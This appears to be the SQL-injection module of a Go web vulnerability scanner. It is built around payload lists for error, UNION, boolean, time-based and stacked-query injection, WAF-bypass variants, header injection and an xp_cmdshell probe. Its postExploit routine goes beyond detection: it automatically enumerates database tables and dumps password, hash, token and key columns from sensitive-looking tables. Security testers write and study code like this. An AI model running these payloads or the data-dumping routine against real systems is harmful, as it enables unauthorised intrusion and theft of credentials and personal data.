package sqli

import (
	"context"
	"fmt"
	"net/http"
	"net/url"
	"strings"
	"time"

	"github.com/erebus/scanner/internal/client"
	"github.com/erebus/scanner/internal/crawler"
	"github.com/erebus/scanner/internal/modules"
	"github.com/erebus/scanner/internal/waf"
)

var errorPatterns = []string{
	"you have an error in your sql syntax",
	"warning: mysql",
	"unclosed quotation mark",
	"quoted string not properly terminated",
	"pg::syntaxerror",
	"org.postgresql.util.psqlexception",
	"microsoft ole db provider for sql server",
	"odbc sql server driver",
	"sqlite3.operationalerror",
	"ora-01756", "ora-00933", "ora-01722",
	"syntax error or access violation",
	"mssql", "mysql_fetch",
	"supplied argument is not a valid mysql",
	"column count doesn't match",
	"unexpected end of sql command",
	"unterminated string literal",
	"invalid query",
	"division by zero",
	"data type mismatch",
	"invalid column name",
	// MariaDB
	"mariadb server version",
	// IBM DB2
	"db2 sql error", "sqlcode=-", "com.ibm.db2",
	// Sybase / ASE
	"adaptive server enterprise", "com.sybase",
	// Generic JDBC
	"could not execute statement",
}

var errorPayloads = []string{
	"'", `"`,
	"'--", `"--`,
	"');--", `");--`,
	"' OR '1'='1",
	"1' ORDER BY 1--",
	"1' ORDER BY 9999--",
	`' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--`,
	`" AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--`,
}

var wafBypassPayloads = []string{
	"'/**/OR/**/'1'='1",
	`'%09OR%091=1--`,
	"'%0aOR%0a'1'='1",
	"'/*!OR*/'1'='1",
	"1'%20OR%20'1'='1",
}

var booleanPairs = [][2]string{
	{"' AND '1'='1'--", "' AND '1'='2'--"},
	{`" AND "1"="1"--`, `" AND "1"="2"--`},
	{"' AND 1=1--", "' AND 1=2--"},
	{"1 AND 1=1", "1 AND 1=2"},
	{"' OR 'x'='x", "' OR 'x'='y"},
	{"') AND ('1'='1", "') AND ('1'='2"},
}

var timePayloads = []struct {
	payload string
	delay   time.Duration
}{
	{"'; WAITFOR DELAY '0:0:5'--", 5 * time.Second},
	{"' AND SLEEP(5)--", 5 * time.Second},
	{"' AND pg_sleep(5)--", 5 * time.Second},
	{"1; SELECT pg_sleep(5)--", 5 * time.Second},
	{"'; SELECT SLEEP(5)--", 5 * time.Second},
	{"' OR SLEEP(5)--", 5 * time.Second},
	{"') OR SLEEP(5)--", 5 * time.Second},
	{`' AND 1=(SELECT 1 FROM (SELECT SLEEP(5))a)--`, 5 * time.Second},
}

// deepTimePayloads — extended time-based payloads covering Oracle, MySQL conditionals,
// and MSSQL xp_cmdshell. Only used in deep scan mode.
var deepTimePayloads = []struct {
	payload string
	delay   time.Duration
}{
	// Oracle
	{"' AND 1=DBMS_PIPE.RECEIVE_MESSAGE(CHR(32),5)--", 5 * time.Second},
	{"' OR 1=DBMS_PIPE.RECEIVE_MESSAGE(CHR(32),5)--", 5 * time.Second},
	// MySQL conditional sleep (WAF-evasion variant)
	{"' AND IF(1=1,SLEEP(5),0)--", 5 * time.Second},
	{"' AND IF(1=1,SLEEP(5),0)#", 5 * time.Second},
	{"' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--", 5 * time.Second},
	{"' AND (SELECT * FROM (SELECT(SLEEP(5)))a)#", 5 * time.Second},
	// PostgreSQL stacked
	{"'; SELECT pg_sleep(5)--", 5 * time.Second},
	// MSSQL: xp_cmdshell confirms command execution capability
	{"'; EXEC xp_cmdshell('ping -n 5 127.0.0.1')--", 4 * time.Second},
}

var sqliHeaders = []string{
	"User-Agent",
	"Referer",
	"X-Forwarded-For",
	"X-Real-IP",
	"X-Client-IP",
	"X-Remote-IP",
	"CF-Connecting-IP",
	"True-Client-IP",
}

const unionCanary = "erebus7x4291canary"

// dbType detected from error message or extraction response
type dbType int

const (
	dbUnknown dbType = iota
	dbMySQL
	dbPostgres
	dbMSSQL
	dbSQLite
	dbOracle
)

// extractionQuery returns UNION-based queries to pull version/user/database for
// each detected DB. Each query uses a single column; the caller wraps it in the
// appropriate UNION skeleton.
var extractionQueries = map[dbType][]struct {
	label string
	expr  string
}{
	dbMySQL: {
		{"version", "@@version"},
		{"user", "user()"},
		{"database", "database()"},
		{"datadir", "@@datadir"},
	},
	dbPostgres: {
		{"version", "version()"},
		{"user", "current_user"},
		{"database", "current_database()"},
		{"search_path", "current_setting('search_path')"},
	},
	dbMSSQL: {
		{"version", "@@version"},
		{"user", "system_user"},
		{"database", "db_name()"},
		{"hostname", "host_name()"},
	},
	dbSQLite: {
		{"version", "sqlite_version()"},
	},
	dbOracle: {
		{"version", "banner FROM v$version WHERE rownum=1--"},
		{"user", "user FROM dual--"},
	},
}

type param struct {
	name    string
	value   string
	inQuery bool
	pageURL string
	form    *crawler.Form
}

type Module struct {
	client *client.Client
}

func New(c *client.Client) *Module {
	return &Module{client: c}
}

func (m *Module) Name() string { return "sqli" }

func (m *Module) Run(ctx context.Context, page crawler.Page) ([]modules.Finding, error) {
	var findings []modules.Finding

	// Augment payloads with WAF-specific bypass variants
	wafResult := waf.FromContext(ctx)
	extraErrorPayloads := buildWAFPayloads(errorPayloads, wafResult)
	extraTimePayloads := buildWAFTimePayloads(timePayloads, wafResult)

	params := collectParams(page)
	for _, p := range params {
		if ctx.Err() != nil {
			break
		}
		var found *modules.Finding
		if found = m.testErrorWithPayloads(ctx, p, page.Body, append(errorPayloads, append(wafBypassPayloads, extraErrorPayloads...)...)); found != nil {
			if u := m.testUnion(ctx, p); u != nil {
				findings = append(findings, *u)
			} else {
				findings = append(findings, *found)
			}
		} else if found = m.testUnion(ctx, p); found != nil {
			findings = append(findings, *found)
		} else if found = m.testBoolean(ctx, p, page.Body); found != nil {
			findings = append(findings, *found)
		} else if found = m.testTimeWithPayloads(ctx, p, append(timePayloads, extraTimePayloads...)); found != nil {
			findings = append(findings, *found)
		}

		if found != nil {
			m.postExploit(ctx, p, found)
		}
	}

	findings = append(findings, m.testHeaders(ctx, page.URL, page.Body)...)

	// Deep mode: stacked query detection + extended DB engine time payloads
	if modules.GetMode(ctx) == modules.ModeDeep {
		for _, p := range params {
			if ctx.Err() != nil {
				break
			}
			if f := m.testStackedQueries(ctx, p, page.Body); f != nil {
				findings = append(findings, *f)
			}
			if f := m.testTimeWithPayloads(ctx, p, deepTimePayloads); f != nil {
				findings = append(findings, *f)
			}
		}
	}

	return findings, nil
}

func buildWAFPayloads(base []string, r *waf.Result) []string {
	if r == nil || r.Kind == waf.Unknown {
		return nil
	}
	var out []string
	for _, p := range base {
		out = append(out, waf.BypassPayloads(p, r.Kind)...)
	}
	return out
}

func buildWAFTimePayloads(base []struct {
	payload string
	delay   time.Duration
}, r *waf.Result) []struct {
	payload string
	delay   time.Duration
} {
	if r == nil || r.Kind == waf.Unknown {
		return nil
	}
	var out []struct {
		payload string
		delay   time.Duration
	}
	for _, p := range base {
		for _, bp := range waf.BypassPayloads(p.payload, r.Kind) {
			out = append(out, struct {
				payload string
				delay   time.Duration
			}{bp, p.delay})
		}
	}
	return out
}

func (m *Module) testErrorWithPayloads(ctx context.Context, p param, baseline []byte, payloads []string) *modules.Finding {
	blStr := strings.ToLower(string(baseline))

	for _, payload := range payloads {
		resp, err := m.inject(ctx, p, p.value+payload)
		if err != nil {
			continue
		}
		body := strings.ToLower(string(resp))
		for _, pattern := range errorPatterns {
			if strings.Contains(body, pattern) && !strings.Contains(blStr, pattern) {
				return &modules.Finding{
					Module:      "sqli",
					Severity:    modules.High,
					URL:         paramURL(p),
					Param:       p.name,
					Payload:     payload,
					Evidence:    "DB error: " + pattern,
					Detail:      fmt.Sprintf("Error-based SQLi in parameter %q", p.name),
					CWE:         "CWE-89",
					CVSS:        9.8,
					CVSSVector:  "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
					Confidence:  modules.Confirmed,
					Remediation: "Use parameterized queries / prepared statements; never interpolate user input into SQL",
					Tags:        []string{"injection", "sqli", "error-based"},
				}
			}
		}
	}
	return nil
}

func (m *Module) testUnion(ctx context.Context, p param) *modules.Finding {
	for cols := 1; cols <= 10; cols++ {
		if ctx.Err() != nil {
			return nil
		}
		for _, prefix := range []string{"' UNION SELECT ", "' UNION ALL SELECT "} {
			// Variant A: all-string — works when column types accept varchar
			allStr := make([]string, cols)
			for i := range allStr {
				allStr[i] = "'" + unionCanary + "'"
			}
			payload := fmt.Sprintf("%s%s--", prefix, strings.Join(allStr, ","))
			if resp, err := m.inject(ctx, p, p.value+payload); err == nil {
				if strings.Contains(string(resp), unionCanary) {
					return &modules.Finding{
						Module:      "sqli",
						Severity:    modules.High,
						URL:         paramURL(p),
						Param:       p.name,
						Payload:     payload,
						Evidence:    fmt.Sprintf("Canary %q reflected (%d columns, string variant)", unionCanary, cols),
						Detail:      fmt.Sprintf("UNION-based SQLi in parameter %q (%d columns)", p.name, cols),
						CWE:         "CWE-89",
						CVSS:        9.8,
						CVSSVector:  "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
						Confidence:  modules.Confirmed,
						Remediation: "Use parameterized queries / prepared statements; never interpolate user input into SQL",
						Tags:        []string{"injection", "sqli", "union-based"},
					}
				}
			}

			// Variant B: NULL-based — NULLs are type-compatible with any column;
			// rotate canary through each position to hit whichever column is reflected.
			for pos := 0; pos < cols; pos++ {
				if ctx.Err() != nil {
					return nil
				}
				nullParts := make([]string, cols)
				for i := range nullParts {
					if i == pos {
						nullParts[i] = "'" + unionCanary + "'"
					} else {
						nullParts[i] = "NULL"
					}
				}
				payload = fmt.Sprintf("%s%s--", prefix, strings.Join(nullParts, ","))
				if resp, err := m.inject(ctx, p, p.value+payload); err == nil {
					if strings.Contains(string(resp), unionCanary) {
						return &modules.Finding{
							Module:      "sqli",
							Severity:    modules.High,
							URL:         paramURL(p),
							Param:       p.name,
							Payload:     payload,
							Evidence:    fmt.Sprintf("Canary %q reflected (%d columns, NULL variant pos %d)", unionCanary, cols, pos),
							Detail:      fmt.Sprintf("UNION-based SQLi in parameter %q (%d columns)", p.name, cols),
							CWE:         "CWE-89",
							CVSS:        9.8,
							CVSSVector:  "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
							Confidence:  modules.Confirmed,
							Remediation: "Use parameterized queries / prepared statements; never interpolate user input into SQL",
							Tags:        []string{"injection", "sqli", "union-based"},
						}
					}
				}
			}
		}
	}
	return nil
}

func (m *Module) testBoolean(ctx context.Context, p param, baseline []byte) *modules.Finding {
	baseLen := len(baseline)
	for _, pair := range booleanPairs {
		trueResp, err := m.inject(ctx, p, p.value+pair[0])
		if err != nil {
			continue
		}
		falseResp, err := m.inject(ctx, p, p.value+pair[1])
		if err != nil {
			continue
		}
		trueLen, falseLen := len(trueResp), len(falseResp)
		if abs(trueLen-baseLen) < imax(50, baseLen/20) &&
			abs(falseLen-baseLen) > imax(100, baseLen/10) &&
			abs(trueLen-falseLen) > imax(80, baseLen/15) {
			return &modules.Finding{
				Module:      "sqli",
				Severity:    modules.High,
				URL:         paramURL(p),
				Param:       p.name,
				Payload:     pair[0],
				Evidence:    fmt.Sprintf("TRUE=%d bytes  FALSE=%d bytes  baseline=%d bytes", trueLen, falseLen, baseLen),
				Detail:      fmt.Sprintf("Boolean-based blind SQLi in parameter %q", p.name),
				CWE:         "CWE-89",
				CVSS:        8.8,
				CVSSVector:  "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
				Confidence:  modules.Likely,
				Remediation: "Use parameterized queries / prepared statements; never interpolate user input into SQL",
				Tags:        []string{"injection", "sqli", "boolean-blind"},
			}
		}
	}
	return nil
}

func (m *Module) testTimeWithPayloads(ctx context.Context, p param, tps []struct {
	payload string
	delay   time.Duration
}) *modules.Finding {
	for _, tp := range tps {
		if ctx.Err() != nil {
			return nil
		}
		start := time.Now()
		_, _ = m.inject(ctx, p, p.value)
		baselineRT := time.Since(start)

		start = time.Now()
		_, err := m.inject(ctx, p, p.value+tp.payload)
		probeRT := time.Since(start)
		if err != nil {
			continue
		}
		if probeRT >= tp.delay-500*time.Millisecond && probeRT > baselineRT+tp.delay/2 {
			return &modules.Finding{
				Module:      "sqli",
				Severity:    modules.High,
				URL:         paramURL(p),
				Param:       p.name,
				Payload:     tp.payload,
				Evidence:    fmt.Sprintf("Probe: %v  Baseline: %v  Δ: %v",
					probeRT.Round(time.Millisecond),
					baselineRT.Round(time.Millisecond),
					(probeRT-baselineRT).Round(time.Millisecond)),
				Detail:      fmt.Sprintf("Time-based blind SQLi in parameter %q", p.name),
				CWE:         "CWE-89",
				CVSS:        8.8,
				CVSSVector:  "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
				Confidence:  modules.Likely,
				Remediation: "Use parameterized queries / prepared statements; never interpolate user input into SQL",
				Tags:        []string{"injection", "sqli", "time-blind"},
			}
		}
	}
	return nil
}

func (m *Module) testHeaders(ctx context.Context, pageURL string, baseline []byte) []modules.Finding {
	blStr := strings.ToLower(string(baseline))
	var findings []modules.Finding

	for _, header := range sqliHeaders {
		if ctx.Err() != nil {
			break
		}
		for _, payload := range append(errorPayloads, wafBypassPayloads...) {
			req, err := http.NewRequestWithContext(ctx, http.MethodGet, pageURL, nil)
			if err != nil {
				continue
			}
			req.Header.Set(header, payload)
			resp, err := m.client.Do(req)
			if err != nil {
				continue
			}
			body, err := client.ReadBody(resp)
			if err != nil {
				continue
			}
			bodyLow := strings.ToLower(string(body))
			for _, pattern := range errorPatterns {
				if strings.Contains(bodyLow, pattern) && !strings.Contains(blStr, pattern) {
					findings = append(findings, modules.Finding{
						Module:      "sqli",
						Severity:    modules.High,
						URL:         pageURL,
						Param:       "header:" + header,
						Payload:     payload,
						Evidence:    "DB error: " + pattern,
						Detail:      fmt.Sprintf("Error-based SQLi via HTTP header %q", header),
						CWE:         "CWE-89",
						CVSS:        9.8,
						CVSSVector:  "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
						Confidence:  modules.Confirmed,
						Remediation: "Sanitize and parameterize all data passed to SQL, including HTTP headers stored in logs/DB",
						Tags:        []string{"injection", "sqli", "header-injection"},
					})
					goto nextHeader
				}
			}
		}
	nextHeader:
	}
	return findings
}

func (m *Module) inject(ctx context.Context, p param, value string) ([]byte, error) {
	if p.inQuery {
		u, err := url.Parse(p.pageURL)
		if err != nil {
			return nil, err
		}
		q := u.Query()
		q.Set(p.name, value)
		u.RawQuery = q.Encode()
		req, err := http.NewRequestWithContext(ctx, http.MethodGet, u.String(), nil)
		if err != nil {
			return nil, err
		}
		resp, err := m.client.Do(req)
		if err != nil {
			return nil, err
		}
		return client.ReadBody(resp)
	}

	if p.form == nil {
		return nil, fmt.Errorf("no form")
	}
	data := make(url.Values)
	for _, f := range p.form.Fields {
		if f.Name == p.name {
			data.Set(f.Name, value)
		} else if f.Value != "" {
			data.Set(f.Name, f.Value)
		} else {
			data.Set(f.Name, "test")
		}
	}
	if strings.ToUpper(p.form.Method) == "POST" {
		req, err := http.NewRequestWithContext(ctx, http.MethodPost, p.form.Action,
			strings.NewReader(data.Encode()))
		if err != nil {
			return nil, err
		}
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
		resp, err := m.client.Do(req)
		if err != nil {
			return nil, err
		}
		return client.ReadBody(resp)
	}
	u, err := url.Parse(p.form.Action)
	if err != nil {
		return nil, err
	}
	u.RawQuery = data.Encode()
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, u.String(), nil)
	if err != nil {
		return nil, err
	}
	resp, err := m.client.Do(req)
	if err != nil {
		return nil, err
	}
	return client.ReadBody(resp)
}

func collectParams(page crawler.Page) []param {
	var params []param
	u, err := url.Parse(page.URL)
	if err == nil {
		for k, v := range u.Query() {
			val := ""
			if len(v) > 0 {
				val = v[0]
			}
			params = append(params, param{name: k, value: val, inQuery: true, pageURL: page.URL})
		}
	}
	for i := range page.Forms {
		for _, f := range page.Forms[i].Fields {
			if f.Type == "hidden" || f.Type == "submit" || f.Type == "button" {
				continue
			}
			params = append(params, param{
				name: f.Name, value: f.Value,
				inQuery: false, pageURL: page.URL, form: &page.Forms[i],
			})
		}
	}
	return params
}

func paramURL(p param) string {
	if p.form != nil {
		return p.form.Action
	}
	return p.pageURL
}

func abs(x int) int {
	if x < 0 {
		return -x
	}
	return x
}

func imax(a, b int) int {
	if a > b {
		return a
	}
	return b
}

// detectDB guesses the backend database from error message patterns.
func detectDB(errorBody string) dbType {
	s := strings.ToLower(errorBody)
	switch {
	case strings.Contains(s, "mysql") || strings.Contains(s, "warning: mysqli") ||
		strings.Contains(s, "you have an error in your sql syntax"):
		return dbMySQL
	case strings.Contains(s, "pg::") || strings.Contains(s, "postgresql") ||
		strings.Contains(s, "psqlexception"):
		return dbPostgres
	case strings.Contains(s, "mssql") || strings.Contains(s, "microsoft ole db") ||
		strings.Contains(s, "odbc sql server") || strings.Contains(s, "unclosed quotation mark"):
		return dbMSSQL
	case strings.Contains(s, "sqlite"):
		return dbSQLite
	case strings.Contains(s, "ora-"):
		return dbOracle
	}
	return dbUnknown
}

// testStackedQueries probes for stacked query support by injecting a second SELECT
// targeting a nonexistent table. If the DB error references the injected table name,
// the backend executed the second statement — confirming stacked query support.
func (m *Module) testStackedQueries(ctx context.Context, p param, baseline []byte) *modules.Finding {
	const tableCanary = "erebusstacked"
	payloads := []string{
		"'; SELECT * FROM " + tableCanary + "--",
		`"; SELECT * FROM ` + tableCanary + `--`,
		"1; SELECT * FROM " + tableCanary + "--",
		"1); SELECT * FROM " + tableCanary + "--",
	}
	blStr := strings.ToLower(string(baseline))

	for _, payload := range payloads {
		if ctx.Err() != nil {
			return nil
		}
		resp, err := m.inject(ctx, p, p.value+payload)
		if err != nil {
			continue
		}
		bodyLow := strings.ToLower(string(resp))
		if strings.Contains(bodyLow, tableCanary) && !strings.Contains(blStr, tableCanary) {
			return &modules.Finding{
				Module:      "sqli",
				Severity:    modules.High,
				URL:         paramURL(p),
				Param:       p.name,
				Payload:     payload,
				Evidence:    fmt.Sprintf("DB error references injected table canary %q — stacked statement was parsed and executed", tableCanary),
				Detail:      fmt.Sprintf("Stacked query execution confirmed in parameter %q: the backend accepts multiple SQL statements separated by semicolons, enabling INSERT/UPDATE/DROP/EXEC attacks", p.name),
				CWE:         "CWE-89",
				CVSS:        9.0,
				CVSSVector:  "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
				Confidence:  modules.Confirmed,
				Remediation: "Use prepared statements; restrict DB user permissions (no DDL/DML on non-app tables); audit ORM raw-query usage",
				Tags:        []string{"injection", "sqli", "stacked-queries", "deep"},
			}
		}
	}
	return nil
}

// postExploit attempts to extract DB metadata and enumerate tables after a confirmed SQLi.
// Results are appended to f.Extracted in-place.
func (m *Module) postExploit(ctx context.Context, p param, f *modules.Finding) {
	db := detectDB(f.Evidence)
	if db == dbUnknown {
		db = dbMySQL
	}

	queries, ok := extractionQueries[db]
	if !ok {
		return
	}

	var extracted []string
	for _, q := range queries {
		if ctx.Err() != nil {
			break
		}
		for cols := 1; cols <= 5; cols++ {
			nulls := make([]string, cols)
			for i := range nulls {
				nulls[i] = "NULL"
			}
			for pos := 0; pos < cols; pos++ {
				parts := make([]string, cols)
				copy(parts, nulls)
				parts[pos] = "CONCAT(0x7e72656275733a," + q.expr + ",0x3a72656275737e)"
				payload := fmt.Sprintf("' UNION SELECT %s--", strings.Join(parts, ","))
				resp, err := m.inject(ctx, p, p.value+payload)
				if err != nil {
					continue
				}
				if val := extractMarker(string(resp)); val != "" {
					extracted = append(extracted, q.label+"="+val)
					goto nextQuery
				}
			}
		}
	nextQuery:
	}

	// Table enumeration
	if tables := m.enumTables(ctx, p, db); len(tables) > 0 {
		extracted = append(extracted, "tables=["+strings.Join(tables, ",")+"]")
		// Extract sample data from sensitive tables
		for _, tbl := range tables {
			if ctx.Err() != nil {
				break
			}
			if isSensitiveTable(tbl) {
				if rows := m.dumpTable(ctx, p, db, tbl); rows != "" {
					extracted = append(extracted, "dump:"+tbl+"="+rows)
				}
			}
		}
	}

	if len(extracted) > 0 {
		f.Extracted = strings.Join(extracted, " | ")
		f.Tags = append(f.Tags, "data-extracted")
	}
}

var tableEnumQueries = map[dbType]string{
	dbMySQL:    "GROUP_CONCAT(table_name ORDER BY table_name SEPARATOR ',') FROM information_schema.tables WHERE table_schema=database()",
	dbPostgres: "string_agg(table_name,',') FROM information_schema.tables WHERE table_schema='public'",
	dbMSSQL:    "STUFF((SELECT ','+name FROM sysobjects WHERE xtype='U' FOR XML PATH('')),1,1,'')",
	dbSQLite:   "group_concat(name) FROM sqlite_master WHERE type='table'",
}

func (m *Module) enumTables(ctx context.Context, p param, db dbType) []string {
	expr, ok := tableEnumQueries[db]
	if !ok {
		return nil
	}
	for cols := 1; cols <= 5; cols++ {
		if ctx.Err() != nil {
			return nil
		}
		nulls := make([]string, cols)
		for i := range nulls {
			nulls[i] = "NULL"
		}
		for pos := 0; pos < cols; pos++ {
			parts := make([]string, cols)
			copy(parts, nulls)
			if db == dbMySQL || db == dbSQLite {
				parts[pos] = "CONCAT(0x7e72656275733a,(" + expr + "),0x3a72656275737e)"
			} else {
				parts[pos] = "'~rebus:'||(" + expr + ")||':rebus~'"
			}
			payload := fmt.Sprintf("' UNION SELECT %s--", strings.Join(parts, ","))
			resp, err := m.inject(ctx, p, p.value+payload)
			if err != nil {
				continue
			}
			if val := extractMarker(string(resp)); val != "" {
				return strings.Split(val, ",")
			}
		}
	}
	return nil
}

var columnQueries = map[dbType]string{
	dbMySQL:    "GROUP_CONCAT(column_name ORDER BY ordinal_position SEPARATOR ',') FROM information_schema.columns WHERE table_schema=database() AND table_name='%s'",
	dbPostgres: "string_agg(column_name,',') FROM information_schema.columns WHERE table_schema='public' AND table_name='%s'",
	dbMSSQL:    "STUFF((SELECT ','+name FROM syscolumns WHERE id=OBJECT_ID('%s') FOR XML PATH('')),1,1,'')",
	dbSQLite:   "group_concat(name) FROM pragma_table_info('%s')",
}

var dataQueries = map[dbType]string{
	dbMySQL:    "CONCAT_WS(':',`%s`) FROM %s LIMIT 1",
	dbPostgres: "(%s)::text FROM %s LIMIT 1",
	dbMSSQL:    "TOP 1 CONCAT(%s) FROM %s",
}

func (m *Module) dumpTable(ctx context.Context, p param, db dbType, table string) string {
	colExpr, ok := columnQueries[db]
	if !ok {
		return ""
	}
	colQ := fmt.Sprintf(colExpr, table)

	var cols string
	for ncols := 1; ncols <= 5; ncols++ {
		if ctx.Err() != nil {
			return ""
		}
		nulls := make([]string, ncols)
		for i := range nulls {
			nulls[i] = "NULL"
		}
		for pos := 0; pos < ncols; pos++ {
			parts := make([]string, ncols)
			copy(parts, nulls)
			if db == dbMySQL || db == dbSQLite {
				parts[pos] = "CONCAT(0x7e72656275733a,(" + colQ + "),0x3a72656275737e)"
			} else {
				parts[pos] = "'~rebus:'||(" + colQ + ")||':rebus~'"
			}
			payload := fmt.Sprintf("' UNION SELECT %s--", strings.Join(parts, ","))
			resp, err := m.inject(ctx, p, p.value+payload)
			if err != nil {
				continue
			}
			if val := extractMarker(string(resp)); val != "" {
				cols = val
				goto gotCols
			}
		}
	}
	return ""
gotCols:
	if cols == "" {
		return ""
	}

	// Pick the most sensitive columns
	colList := strings.Split(cols, ",")
	interesting := pickInterestingColumns(colList)
	if len(interesting) == 0 {
		interesting = colList[:min(3, len(colList))]
	}

	// Extract first row
	var colExprParts []string
	for _, c := range interesting {
		colExprParts = append(colExprParts, "`"+c+"`")
	}
	selectCols := strings.Join(colExprParts, ",0x3a,")

	for ncols := 1; ncols <= 5; ncols++ {
		if ctx.Err() != nil {
			return ""
		}
		nulls := make([]string, ncols)
		for i := range nulls {
			nulls[i] = "NULL"
		}
		for pos := 0; pos < ncols; pos++ {
			parts := make([]string, ncols)
			copy(parts, nulls)
			if db == dbMySQL {
				parts[pos] = "CONCAT(0x7e72656275733a,CONCAT_WS(0x3a," + strings.Join(colExprParts, ",") + "),0x3a72656275737e) FROM " + table + " LIMIT 1"
				payload := fmt.Sprintf("' UNION SELECT %s--", strings.Join(parts, ","))
				resp, err := m.inject(ctx, p, p.value+payload)
				if err != nil {
					continue
				}
				if val := extractMarker(string(resp)); val != "" {
					return strings.Join(interesting, ":") + " → " + val
				}
			}
			_ = selectCols
		}
	}
	return ""
}

func extractMarker(body string) string {
	start := strings.Index(body, "~rebus:")
	end := strings.Index(body, ":rebus~")
	if start != -1 && end != -1 && end > start+7 {
		return body[start+7 : end]
	}
	return ""
}

var sensitiveTablePrefixes = []string{
	"user", "account", "admin", "auth", "credential",
	"password", "passwd", "member", "staff", "employee",
	"customer", "login", "session", "token", "secret",
	"key", "role", "permission",
}

func isSensitiveTable(name string) bool {
	low := strings.ToLower(name)
	for _, prefix := range sensitiveTablePrefixes {
		if strings.Contains(low, prefix) {
			return true
		}
	}
	return false
}

var interestingColPatterns = []string{
	"password", "passwd", "pwd", "pass",
	"hash", "secret", "token", "key",
	"email", "username", "user", "login",
	"admin", "role", "salt", "api_key",
}

func pickInterestingColumns(cols []string) []string {
	var out []string
	for _, c := range cols {
		low := strings.ToLower(c)
		for _, p := range interestingColPatterns {
			if strings.Contains(low, p) {
				out = append(out, c)
				break
			}
		}
		if len(out) >= 5 {
			break
		}
	}
	return out
}

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}
